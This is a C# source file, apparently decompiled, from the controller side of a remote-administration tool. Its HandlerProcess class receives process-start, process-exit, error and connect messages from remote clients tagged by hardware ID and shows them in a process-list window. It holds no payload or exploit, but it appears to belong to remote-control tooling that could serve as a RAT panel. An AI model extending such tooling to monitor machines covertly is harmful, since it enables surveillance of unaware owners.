using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerProcess
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		switch (a)
		{
		default:
		{
			if (!(a == "Error"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormProcess form3 = (FormProcess)client.Tag;
			form3.Invoke((MethodInvoker)delegate
			{
				form3.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		case "NewProcess":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormProcess form2 = (FormProcess)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.materialLabel1.Text = "New Process pid: " + (int)objects[4];
				DataGridViewRow dataGridViewRow = new DataGridViewRow
				{
					Cells = 
					{
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[2]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (int)objects[4]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[3]
						}
					}
				};
				form2.dataGridView2.Rows.Add(dataGridViewRow);
				form2.Text = $"Process [{client.Hwid}] Process [{form2.dataGridView2.Rows.Count}]";
			});
			break;
		}
		case "DeadProcess":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormProcess form4 = (FormProcess)client.Tag;
			form4.Invoke((MethodInvoker)delegate
			{
				form4.materialLabel1.Text = "Dead Process pid: " + (int)objects[2];
				foreach (DataGridViewRow dataGridViewRow in (IEnumerable)form4.dataGridView2.Rows)
				{
					if ((int)dataGridViewRow.Cells[1].Value == (int)objects[2])
					{
						form4.dataGridView2.Rows.Remove(dataGridViewRow);
						break;
					}
				}
				form4.Text = $"Process [{client.Hwid}] Process [{form4.dataGridView2.Rows.Count}]";
			});
			break;
		}
		case "Connect":
		{
			FormProcess form = (FormProcess)Application.OpenForms["Process:" + (string)objects[2]];
			if (form == null)
			{
				client.Disconnect();
				break;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Process [" + (string)objects[2] + "] Process [0]";
				form.materialLabel1.Text = "Succues Connect";
				form.client = client;
				form.dataGridView2.Enabled = true;
			});
			client.Tag = form;
			client.Hwid = (string)objects[2];
			break;
		}
		}
	}
}
